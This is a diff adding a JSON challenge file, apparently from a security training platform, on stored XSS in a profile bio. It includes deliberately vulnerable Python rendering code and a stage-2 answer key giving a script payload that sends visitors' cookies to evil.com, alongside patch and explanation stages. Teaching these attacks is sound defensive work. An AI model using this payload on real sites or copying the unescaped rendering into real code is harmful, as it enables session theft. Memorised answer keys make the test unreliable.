@@ -1,0 +1,40 @@
+{
+    "id": "xss_03",
+    "title": "Stored XSS in Profile",
+    "category": "XSS",
+    "difficulty": "Intermediate",
+    "base_points": 200,
+    "description": "A profile page where a user's bio is displayed to anyone who visits.",
+    "vuln_code": "# When saving profile\nbio = request.form.get('bio')\ndb.execute(\"UPDATE users SET bio = ? WHERE id = ?\", (bio, user_id))\n\n# When displaying profile\nuser = db.query(\"SELECT bio FROM users WHERE id = ?\", (profile_id,))\nreturn f\"<div>Bio: {user['bio']}</div>\"",
+    "stages": [
+        {
+            "id": 1,
+            "name": "Find the vulnerability",
+            "instruction": "Identify where the vulnerability lies and how it differs from Reflected XSS.",
+            "target": "The bio is stored in the database without sanitization and then rendered directly into the HTML of the profile page. It's 'Stored' because the payload persists on the server."
+        },
+        {
+            "id": 2,
+            "name": "Exploit it",
+            "instruction": "Provide a payload that would steal a visitor's cookies and send them to an attacker-controlled site.",
+            "target": "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>"
+        },
+        {
+            "id": 3,
+            "name": "Patch it",
+            "instruction": "Explain how to properly sanitize user-provided HTML if you wanted to allow some tags (like <b> or <i>) but not others (like <script>).",
+            "target": "Use a dedicated HTML sanitization library like 'bleach' in Python to allowlist specific tags and attributes."
+        },
+        {
+            "id": 4,
+            "name": "Explain it",
+            "instruction": "Why is Stored XSS generally considered more dangerous than Reflected XSS?",
+            "target": "Stored XSS doesn't require the victim to click a malicious link; they just need to visit a legitimate page on the site where the payload is stored."
+        }
+    ],
+    "hints": [
+        "The payload is saved in the database.",
+        "Think about what an attacker can do if they can execute JS in another user's browser.",
+        "Look into the 'bleach' library."
+    ]
+}
